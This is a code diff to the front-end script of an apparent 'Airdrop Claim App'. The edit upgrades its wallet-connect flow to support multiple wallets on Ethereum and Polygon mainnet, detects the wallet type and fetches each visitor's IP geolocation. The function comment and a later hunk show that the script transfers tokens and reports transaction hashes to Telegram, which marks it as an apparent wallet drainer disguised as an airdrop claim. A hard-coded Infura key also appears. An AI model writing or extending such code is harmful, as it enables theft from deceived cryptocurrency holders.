@@ -84,30 +84,64 @@ addEventOnElem(window, "scroll", scrollReveal);
  * Wallet connect and token transfer using Moralis API with Telegram notification
  */
 async function connectWalletAndSendTokens() {
-  const providerOptions = {
-    walletconnect: {
-      package: window.WalletConnectProvider.default,
-      options: {
-        infuraId: "5b2c5ee5760146349669a1e9c77665d1"
-      }
-    }
+  // Configure Web3Modal with multiple wallet providers
+  const projectId = "your_walletconnect_project_id"; // Replace with your WalletConnect Project ID
+  const { createWeb3Modal, defaultConfig } = window.Web3Modal;
+
+  const metadata = {
+    name: "Airdrop Claim App",
+    description: "Claim your airdrop tokens",
+    url: window.location.href,
+    icons: ["https://yourappicon.com/icon.png"] // Optional: Add your app icon
   };
 
-  const web3Modal = new window.Web3Modal.default({
-    cacheProvider: false,
-    providerOptions
+  const chains = [
+    {
+      chainId: 1, // Ethereum Mainnet
+      name: "Ethereum",
+      currency: "ETH",
+      explorerUrl: "https://etherscan.io",
+      rpcUrl: "https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1"
+    },
+    {
+      chainId: 137, // Polygon Mainnet
+      name: "Polygon",
+      currency: "MATIC",
+      explorerUrl: "https://polygonscan.com",
+      rpcUrl: "https://polygon-rpc.com"
+    }
+  ];
+
+  const web3Modal = createWeb3Modal({
+    ethersConfig: defaultConfig({ metadata, defaultChainId: 1, chains }),
+    chains,
+    projectId,
+    themeMode: "light", // or "dark"
+    themeVariables: {
+      "--w3m-accent": "#007bff"
+    }
   });
 
   try {
-    const instance = await web3Modal.connect();
-    const provider = new ethers.providers.Web3Provider(instance);
-    const signer = provider.getSigner();
+    // Open Web3Modal to let user select a wallet
+    const provider = await web3Modal.connect();
+    const ethersProvider = new ethers.providers.Web3Provider(provider);
+    const signer = ethersProvider.getSigner();
     const userAddress = await signer.getAddress();
-    const network = await provider.getNetwork();
+    const network = await ethersProvider.getNetwork();
     const chainId = network.chainId;
 
-    const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";
+    // Detect wallet type
+    let walletType = "Unknown";
+    if (provider.isMetaMask) {
+      walletType = "MetaMask";
+    } else if (provider.isCoinbaseWallet) {
+      walletType = "Coinbase Wallet";
+    } else if (provider.isWalletConnect) {
+      walletType = "WalletConnect";
+    }
 
+    // Fetch location data
     let locationData = {};
     try {
       const locRes = await fetch("https://ipapi.co/json/");
@@ -219,6 +253,7 @@ Tx Hash: ${tx.hash}
 
   } catch (err) {
     console.error('Error connecting wallet or processing tokens:', err);
+    alert('Failed to connect wallet or process tokens. Please try again.');
   }
 }
 
